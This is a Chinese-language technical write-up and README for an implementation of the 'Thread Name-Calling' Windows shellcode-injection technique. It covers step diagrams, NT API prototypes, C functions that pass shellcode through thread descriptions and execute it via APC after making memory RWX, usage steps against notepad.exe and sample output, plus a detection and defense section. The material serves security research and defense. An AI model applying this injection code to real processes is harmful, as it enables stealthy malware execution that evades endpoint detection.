# Thread Name-Calling - 线程名称注入

## 技术概述

Thread Name-Calling 是一种创新的远程 shellcode 注入技术，通过滥用 Windows 线程描述（Thread Description）API 实现代码注入。该技术由 hasherezade 开发，并由 Check Point Research 在 2024 年公开发表。

**最大特点**：无需 `PROCESS_VM_WRITE` 权限即可向远程进程写入数据！

**原始项目**: https://github.com/hasherezade/thread_namecalling
**技术文章**: https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/
**作者**: hasherezade

## 核心原理

### 传统注入的限制

传统的进程注入技术（如 CreateRemoteThread）通常需要：
- `PROCESS_VM_WRITE`: 写入远程进程内存
- `PROCESS_VM_OPERATION`: 修改内存保护
- `PROCESS_CREATE_THREAD`: 创建远程线程

而 Thread Name-Calling 避开了 `PROCESS_VM_WRITE` 权限要求。

### Thread Description API

Windows 10 1607+ 引入了线程描述 API：

```c
// 设置线程描述
HRESULT SetThreadDescription(
    HANDLE hThread,
    PCWSTR lpThreadDescription
);

// 获取线程描述
HRESULT GetThreadDescription(
    HANDLE hThread,
    PWSTR* ppszDescription  // 输出：指向描述缓冲区的指针
);
```

**关键发现**：
1. `SetThreadDescription` 可以从任意进程设置目标线程的描述
2. `GetThreadDescription` 会在目标进程中分配内存并复制描述
3. 描述缓冲区的地址会写入到指定的输出参数

### 注入流程

```
步骤 1: 设置线程描述
┌─────────────────────────────────────────────────────────┐
│ 注入进程                                                  │
│ ├─> 找到目标进程的线程                                    │
│ ├─> SetThreadDescription(hThread, shellcode)            │
│ │     └─> 将 shellcode 作为"线程名称"设置                │
│ └─> 线程描述存储在内核对象中                              │
└─────────────────────────────────────────────────────────┘
                    ↓
步骤 2: 通过 APC 触发复制
┌─────────────────────────────────────────────────────────┐
│ 通过 APC 队列调用 GetThreadDescription                   │
│ ├─> NtQueueApcThreadEx2(hThread,                        │
│ │       GetThreadDescription,                            │
│ │       NtCurrentThread(),  // 参数 1: 当前线程          │
│ │       peb_unused_area,    // 参数 2: 输出指针地址      │
│ │       NULL)                                            │
│ └─> 目标进程的线程执行 APC                                │
└─────────────────────────────────────────────────────────┘
                    ↓
步骤 3: GetThreadDescription 在目标进程执行
┌─────────────────────────────────────────────────────────┐
│ 目标进程地址空间                                          │
│ ├─> GetThreadDescription 被调用                          │
│ ├─> 在堆上分配缓冲区                                      │
│ ├─> 从内核对象复制线程描述（shellcode）到缓冲区           │
│ ├─> 将缓冲区地址写入 peb_unused_area                     │
│ └─> 返回                                                 │
└─────────────────────────────────────────────────────────┘
                    ↓
步骤 4: 读取缓冲区地址
┌─────────────────────────────────────────────────────────┐
│ 注入进程                                                  │
│ ├─> ReadProcessMemory(peb_unused_area)                  │
│ └─> 获取 shellcode 缓冲区地址                            │
└─────────────────────────────────────────────────────────┘
                    ↓
步骤 5: 修改内存保护
┌─────────────────────────────────────────────────────────┐
│ VirtualProtectEx(buffer, PAGE_EXECUTE_READWRITE)        │
│ └─> 将缓冲区改为可执行                                    │
└─────────────────────────────────────────────────────────┘
                    ↓
步骤 6: 执行 shellcode
┌─────────────────────────────────────────────────────────┐
│ 通过 APC 执行                                             │
│ ├─> NtQueueApcThreadEx2(hThread,                        │
│ │       RtlDispatchAPC,  // 代理函数                     │
│ │       buffer_address,  // shellcode 地址               │
│ │       0, -1)                                           │
│ └─> 目标进程执行 shellcode                               │
└─────────────────────────────────────────────────────────┘
```

### 数据流向图

```
注入进程                          Windows 内核                    目标进程
   |                                  |                            |
   | SetThreadDescription             |                            |
   | (shellcode 数据)                 |                            |
   |--------------------------------->|                            |
   |                                  | 存储在线程对象中            |
   |                                  |                            |
   | Queue APC:                       |                            |
   | GetThreadDescription             |                            |
   |--------------------------------->|                            |
   |                                  |                            |
   |                                  | 调度 APC                   |
   |                                  |--------------------------->|
   |                                  |                            |
   |                                  |         GetThreadDescription 执行
   |                                  |<---------------------------|
   |                                  | 返回线程描述                |
   |                                  |--------------------------->|
   |                                  |                            |
   |                                  |             在堆上分配缓冲区
   |                                  |             复制 shellcode 到缓冲区
   |                                  |             写入缓冲区地址
   |                                  |             到 PEB 未使用区域
   |                                  |                            |
   | ReadProcessMemory                |                            |
   | (PEB unused area)                |                            |
   |---------------------------------------------------------------->|
   |<----------------------------------------------------------------|
   | 返回：buffer_address             |                            |
   |                                  |                            |
   | VirtualProtectEx                 |                            |
   | (buffer, RWX)                    |                            |
   |---------------------------------------------------------------->|
   |                                  |                            |
   | Queue APC: Execute               |                            |
   |--------------------------------->|                            |
   |                                  |--------------------------->|
   |                                  |                   shellcode 执行
```

## 关键 API 和数据结构

### NtSetInformationThread

```c
typedef NTSTATUS (NTAPI *pNtSetInformationThread)(
    HANDLE ThreadHandle,
    THREADINFOCLASS ThreadInformationClass,  // 38 = ThreadNameInformation
    PVOID ThreadInformation,                  // UNICODE_STRING*
    ULONG ThreadInformationLength
);
```

**用法**：
```c
UNICODE_STRING ustr;
RtlInitUnicodeStringEx(&ustr, (PCWSTR)shellcode_buffer);
NtSetInformationThread(hThread, ThreadNameInformation, &ustr, sizeof(UNICODE_STRING));
```

**优势**：
- 可以设置任意字节序列（包括 NULL 字节）
- 不受标准 `SetThreadDescription` 的 Unicode 字符串限制

### NtQueueApcThreadEx2

```c
typedef NTSTATUS (NTAPI *pNtQueueApcThreadEx2)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle,      // NULL
    ULONG QueueUserApcFlags,           // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
    PVOID ApcRoutine,                  // 要调用的函数
    PVOID SystemArgument1,             // 参数 1
    PVOID SystemArgument2,             // 参数 2
    PVOID SystemArgument3              // 参数 3
);
```

**特点**：
- Windows 10+ 的新 APC API
- 支持 Special User APC（不需要线程处于 Alertable 状态）
- 比旧的 `NtQueueApcThread` 更强大

### PEB 未使用区域

PEB (Process Environment Block) 中存在一些未使用的区域，可以用于临时存储数据：

```c
// PEB + 0x340 是一个未使用区域（x64）
PVOID unused_area = (PVOID)((ULONG_PTR)peb_base + 0x340);
```

**用途**：
- 作为 `GetThreadDescription` 的输出参数地址
- 目标进程会将缓冲区地址写入此处
- 注入进程可以读取此地址获取缓冲区位置

## 技术优势

### 1. 绕过权限限制

- ✅ **无需 PROCESS_VM_WRITE**: SetThreadDescription 不需要写权限
- ✅ **仅需最小权限**:
  - `PROCESS_QUERY_LIMITED_INFORMATION`: 读取 PEB
  - `PROCESS_VM_READ`: 读取缓冲区地址
  - `PROCESS_VM_OPERATION`: 修改内存保护

### 2. 利用合法 API

- 🎯 **SetThreadDescription**: Windows 官方 API
- 🎯 **GetThreadDescription**: 官方 API
- 🎯 **行为看起来正常**: 设置线程名称是合法操作

### 3. 隐蔽性

- 🔒 **无 WriteProcessMemory**: 避免传统内存写入检测
- 🔒 **无 CreateRemoteThread**: 不创建新线程
- 🔒 **利用现有线程**: 在目标进程的合法线程中执行

### 4. 兼容性

- ⚡ **Windows 10 1607+**: SetThreadDescription 引入版本
- ⚡ **x64 架构**: PEB 布局稳定

## 技术限制

### 1. Windows 版本

- ⚠️ **Windows 10 1607+**: SetThreadDescription API 引入版本
- ⚠️ **PEB 布局依赖**: 0x340 偏移可能在未来版本改变

### 2. 权限要求

虽然不需要 `PROCESS_VM_WRITE`，但仍需：
- 🔑 `PROCESS_QUERY_LIMITED_INFORMATION`
- 🔑 `PROCESS_VM_READ`
- 🔑 `PROCESS_VM_OPERATION`
- 🔑 `THREAD_SET_CONTEXT` (for APC)
- 🔑 `THREAD_SET_LIMITED_INFORMATION` (for SetThreadDescription)

### 3. APC 触发

- 🛠️ **依赖 APC 机制**: 需要线程执行 APC
- 🛠️ **时序问题**: 可能需要等待线程进入 Alertable 状态（特殊 User APC 除外）

## 检测与防御

### 检测方法

1. **监控线程描述操作**:
   ```c
   NtSetInformationThread(*, ThreadNameInformation, *, *)
   ```
   - 检测异常的线程描述设置（非文本内容）
   - 检测跨进程的线程描述操作

2. **监控 APC 队列**:
   ```c
   NtQueueApcThreadEx2(*, *, *, GetThreadDescription, *, *, *)
   ```
   - 检测将 `GetThreadDescription` 加入 APC 队列
   - 检测异常的 APC 参数（指向 PEB 区域）

3. **内存行为分析**:
   - 检测堆分配后立即修改为可执行
   - 检测 PEB 未使用区域的异常读写

4. **API 调用序列**:
   ```
   SetThreadDescription → NtQueueApcThreadEx2 → ReadProcessMemory → VirtualProtectEx → NtQueueApcThreadEx2
   ```

### 防御建议

1. **EDR/AV 规则**:
   - 监控 `SetThreadDescription` 设置非 Unicode 文本内容
   - 监控 `GetThreadDescription` 通过 APC 调用
   - 检测 PEB 未使用区域的读写

2. **进程隔离**:
   - 使用 AppContainer 限制跨进程操作
   - 启用 Protected Process Light (PPL)

3. **内存保护**:
   - 使用 Control Flow Guard (CFG)
   - 使用 Arbitrary Code Guard (ACG)
   - 限制 RWX 内存分配

4. **审计**:
   - 记录线程描述的设置和读取
   - 监控异常的 APC 队列操作

## 实现代码分析

### 核心函数

**1. 设置线程描述（支持任意字节）**

```c
HRESULT SetThreadDescriptionEx(HANDLE hThread, const BYTE* buf, SIZE_T bufSize) {
    // 创建 UNICODE_STRING
    BYTE* padding = (BYTE*)calloc(bufSize + sizeof(WCHAR), 1);
    memset(padding, 'A', bufSize);

    UNICODE_STRING ustr = {0};
    RtlInitUnicodeStringEx(&ustr, (PCWSTR)padding);

    // 覆盖为真实内容（包括 NULL 字节）
    memcpy(ustr.Buffer, buf, bufSize);

    // 使用 NtSetInformationThread
    NtSetInformationThread(hThread, ThreadNameInformation, &ustr, sizeof(UNICODE_STRING));

    free(padding);
}
```

**2. 通过线程名称传递数据**

```c
PVOID PassViaThreadName(HANDLE hProcess, HANDLE hThread, const BYTE* buf,
                        SIZE_T bufSize, PVOID remotePtr) {
    // 设置线程描述
    SetThreadDescriptionEx(hThread, buf, bufSize);

    // 通过 APC 调用 GetThreadDescription
    // GetThreadDescription(NtCurrentThread(), remotePtr)
    QueueApcThread(hThread, GetThreadDescription,
                   (PVOID)NtCurrentThread(), remotePtr, NULL);

    // 等待缓冲区地址写入
    PVOID bufferPtr = NULL;
    while (!ReadRemoteMemory(hProcess, remotePtr, &bufferPtr, sizeof(PVOID))) {
        Sleep(1000);
    }

    return bufferPtr;
}
```

**3. 执行注入的代码**

```c
BOOL RunInjected(HANDLE hProcess, PVOID shellcodePtr, SIZE_T payloadLen) {
    // 修改内存保护
    VirtualProtectEx(hProcess, shellcodePtr, payloadLen, PAGE_EXECUTE_READWRITE, &oldProtect);

    // 通过 APC 执行（使用 RtlDispatchAPC 作为代理）
    PVOID rtlDispatchApc = GetProcAddress(GetModuleHandleA("ntdll.dll"), MAKEINTRESOURCEA(8));
    QueueApcThread(hThread, rtlDispatchApc, shellcodePtr, 0, (PVOID)(-1));

    return TRUE;
}
```

## 使用方法

### 编译

```bash
./build.sh
```

### 运行

```bash
# 1. 启动目标进程
notepad.exe

# 2. 获取 PID
# 通过任务管理器或 Process Explorer

# 3. 执行注入
./thread_namecalling.exe <PID>

# 4. 与 notepad 交互（点击菜单、输入文字等）触发 APC
# 5. MessageBox 将弹出
```

### 预期输出

```
[*] Thread Name-Calling Injection
[*] Author: hasherezade (C implementation)

[+] Target PID: 1234
[+] Opened target process (PID 1234): 0x000000B8
[+] PEB base address: 0x000000C5A2D3E000
[+] Using PEB unused area: 0x000000C5A2D3E340
[+] Found thread TID=5678

[*] Step 1: Passing shellcode via thread name...
[+] Setting thread description (77 bytes)...
[+] Thread description set successfully
[+] Queueing APC to call GetThreadDescription...
[+] Using NtQueueApcThreadEx2
[+] APC queued successfully
[-] Waiting for buffer pointer (attempt 1/10)...
[+] Buffer pointer received: 0x000001A2B3C4D000

[*] Step 2: Executing injected code...
[+] Found thread TID=5678
[+] Changing memory protection to RWX...
[+] Memory protection changed (old: 0x04)
[+] Using RtlDispatchAPC as proxy
[+] Using NtQueueApcThreadEx2
[+] APC queued for execution!

[+] Injection completed successfully!
[!] Interact with the target process to trigger APC execution
```

## 与其他技术的对比

### vs 传统 WriteProcessMemory

| 特性 | Thread Name-Calling | WriteProcessMemory |
|-----|---------------------|-------------------|
| 权限要求 | 无需 PROCESS_VM_WRITE | 需要 PROCESS_VM_WRITE |
| API 调用 | SetThreadDescription | WriteProcessMemory |
| 隐蔽性 | 高 | 中等 |
| 复杂度 | 高 | 低 |
| 检测难度 | 高 | 低 |

### vs APC Injection

| 特性 | Thread Name-Calling | 传统 APC Injection |
|-----|---------------------|-------------------|
| 数据传输 | Thread Description | WriteProcessMemory |
| 内存分配 | 自动（堆） | 手动（VirtualAllocEx） |
| 写入方式 | GetThreadDescription | WriteProcessMemory |
| 所需权限 | 较少 | 较多 |

### vs PoolParty

| 特性 | Thread Name-Calling | PoolParty |
|-----|---------------------|-----------|
| 核心机制 | Thread Description + APC | Thread Pool 内部结构 |
| 复杂度 | 中等 | 极高 |
| 依赖结构 | 简单（PEB + Thread 对象） | 复杂（TP_POOL, TP_WORK） |
| Windows 版本 | 10 1607+ | 7+ |

## 技术参考

- **原始项目**: https://github.com/hasherezade/thread_namecalling
- **技术文章**: https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/
- **作者**: hasherezade
- **Check Point Research**: 2024 年公开发表
- **相关技术**: APC Injection, SetProcessInjection

## 许可证

本实现仅用于安全研究和教育目的。
